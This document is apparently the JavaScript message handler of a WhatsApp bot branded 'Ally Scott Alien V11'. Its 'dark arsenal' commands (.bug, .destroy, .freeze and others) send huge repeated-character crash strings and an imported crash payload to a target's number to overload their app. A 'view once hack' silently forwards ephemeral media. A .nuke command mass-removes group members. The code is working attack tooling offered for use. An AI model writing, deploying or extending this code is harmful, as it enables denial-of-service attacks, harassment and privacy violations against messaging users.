const fs = require('fs');
const payloads = require('./payloads');

// --- ALIEN CRASH STRINGS (VIRUS) ---
const bug1 = "🌋".repeat(50000); 
const bug2 = "⡈⡈⡈⡈⡈⡈".repeat(10000); 
const bug3 = "҈".repeat(20000); 

module.exports = async (client, m) => {
    try {
        if (!m.message) return; 
        const from = m.key.remoteJid;
        const type = Object.keys(m.message)[0];
        const pushname = m.pushName || "User";
        const sender = m.key.participant || m.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const isOwner = sender.includes("255629308154") || m.key.remoteJid.includes("255629308154");

        // --- BODY READER ---
        let body = (type === 'conversation') ? m.message.conversation : 
                   (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
                   (type === 'imageMessage') ? m.message.imageMessage.caption : 
                   (type === 'videoMessage') ? m.message.videoMessage.caption : 
                   (type === 'viewOnceMessageV2') ? m.message.viewOnceMessageV2.message.imageMessage?.caption || m.message.viewOnceMessageV2.message.videoMessage?.caption : '';
        
        const isCmd = body.startsWith('.');
        const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);

        // --- SYSTEM SETTINGS ---
        let settings = { 
            antilink: true, 
            antidelete: true, 
            autostatus: true, 
            statuslike: true,
            autoreact: true,
            anticall: true,
            viewoncehack: true
        };

        // 1. AUTO STATUS VIEW & LIKE
        if (m.key.remoteJid === 'status@broadcast' && settings.autostatus) {
            await client.readMessages([m.key]);
            if (settings.statuslike) {
                await client.sendMessage(m.key.remoteJid, { react: { text: '🔥', key: m.key } }, { statusJidList: [m.key.participant] });
            }
        }

        // 2. VIEW ONCE HACK
        if ((type === 'viewOnceMessageV2' || type === 'viewOnceMessage') && settings.viewoncehack) {
            let viewOnce = m.message.viewOnceMessageV2 || m.message.viewOnceMessage;
            await client.sendMessage(client.user.id, { forward: viewOnce, caption: `🔓 *View Once Hack* \nFrom: @${sender.split('@')[0]}`, mentions: [sender] });
        }

        // 3. ANTI-LINK
        if (isGroup && body.match(/chat.whatsapp.com/gi) && settings.antilink && !isOwner) {
            await client.sendMessage(from, { delete: m.key });
            await client.sendMessage(from, { text: `🚫 *Link Detected!* Link ni marufuku hapa.` });
        }

        // 4. AUTO REACT
        if (body && settings.autoreact && !isCmd && !m.key.fromMe) {
            const emojis = ['👽', '👾', '⚡', '🤖', '☠️'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            await client.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
        }

        if (!isCmd) return;

        // --- COMMANDS ---
        switch (command) {
            case 'menu': {
                let status = (val) => val ? "✅ ON" : "❌ OFF";
                let menuText = `
   *◜ ALLY SCOTT ALIEN V11 ◞*
   _Security is an Illusion_

┏━━━━━━━━━━━━━━━━━━┓
┃ 👤 *User:* ${pushname}
┃ 🛠️ *Rank:* Grey Hat Admin
┗━━━━━━━━━━━━━━━━━━┛

┏━━『 *SYSTEM CONFIG* 』━━┓
┃ 🛡️ *Antilink:* ${status(settings.antilink)}
┃ 🗑️ *Antidelete:* ${status(settings.antidelete)}
┃ 📸 *Autostatus:* ${status(settings.autostatus)}
┃ ❤️ *StatusLike:* ${status(settings.statuslike)}
┃ 🤖 *Autoreact:* ${status(settings.autoreact)}
┃ 📞 *Anticall:* ${status(settings.anticall)}
┗━━━━━━━━━━━━━━━━━┛

┏━━『 *DARK ARSENAL* 』━━┓
┃ ☣️ *.bug* [Target]
┃ 💀 *.destroy* [Target]
┃ 🧊 *.freeze* [Target]
┃ 📂 *.docbug* [Target]
┃ 💉 *.vcrash* [Target]
┃ ♾️ *.infinity* [Target]
┃ 🔍 *.inspect* [User]
┃ 🔓 *.vv* (Manual Hack)
┃ 🧨 *.nuke* (Group Wipe)
┗━━━━━━━━━━━━━━━━┛

┏━━『 *TERMINAL & UTILS* 』━━┓
┃ ⚡ *.ping* - Speed Test
┃ 👽 *.alienscott* - Special Logo
┃ 🛸 *.system* - System Specs
┃ 👻 *.hidetag* [Text] - Tag All
┃ 🔒 *.public* / *.private*
┃ 📝 *.logs* - View Traffic
┃ 🛑 *.shutdown* - Kill System
┗━━━━━━━━━━━━━━━━┛

*© 2026 ALLY SCOTT - KILLER EDITION*`;
                await client.sendMessage(from, { react: { text: '👽', key: m.key } });
                await client.sendMessage(from, { text: menuText }, { quoted: m });
            }
            break;

            case 'alienscott': {
                await client.sendMessage(from, { text: payloads.alien_logo });
            }
            break;

            case 'system': {
                await client.sendMessage(from, { text: payloads.system_info });
            }
            break;

            case 'ping':
                await client.sendMessage(from, { text: "🚀 *ALLY SCOTT V11* Response: " + (Date.now() - m.messageTimestamp * 1000) + "ms" });
                break;

            case 'hidetag': {
                if (!isGroup || !isOwner) return;
                const groupMetadata = await client.groupMetadata(from);
                const participants = groupMetadata.participants;
                let text = args.length > 0 ? args.join(' ') : '📢 *ALLY SCOTT SYSTEM BROADCAST*';
                client.sendMessage(from, { text: text, mentions: participants.map(a => a.id) });
            }
            break;

            case 'bug':
            case 'destroy':
            case 'freeze':
            case 'infinity':
            case 'docbug': {
                if (!isOwner) return;
                if (!args[0]) return client.sendMessage(from, { text: "Weka namba ya target!" });
                let target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                await client.sendMessage(from, { text: `🚀 *Injecting Alien Payloads:* ${command} ➔ ${target}` });
                
                await client.sendMessage(target, { text: bug1 });
                await client.sendMessage(target, { text: bug2 });
                await client.sendMessage(target, { text: bug3 });

                for (let i = 0; i < 3; i++) {
                    if (payloads.crashPayload) {
                        await client.sendMessage(target, { text: payloads.crashPayload });
                    }
                }
                await client.sendMessage(from, { text: "✅ *System Overloaded!* Success." });
            }
            break;

            case 'vv': {
                if (!m.message.extendedTextMessage?.contextInfo?.quotedMessage) return client.sendMessage(from, { text: "Tag view once message!" });
                let quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
                let viewOnce = quoted.viewOnceMessageV2 || quoted.viewOnceMessage;
                if (viewOnce) {
                    await client.sendMessage(from, { forward: { key: m.key, message: quoted }, caption: `🔓 *View Once Recovered*` });
                }
            }
            break;

            case 'nuke': {
                if (!isOwner || !isGroup) return;
                const groupMetadata = await client.groupMetadata(from);
                for (let mem of groupMetadata.participants) {
                    if (!mem.admin) await client.groupParticipantsUpdate(from, [mem.id], "remove");
                }
                await client.sendMessage(from, { text: "🧨 *Nuked!*" });
            }
            break;

            case 'shutdown': {
                if (!isOwner) return;
                await client.sendMessage(from, { text: "🛑 *System Shutting Down...*" });
                process.exit();
            }
            break;
        }
    } catch (e) {
        console.log("Error in message.js:", e);
    }
};
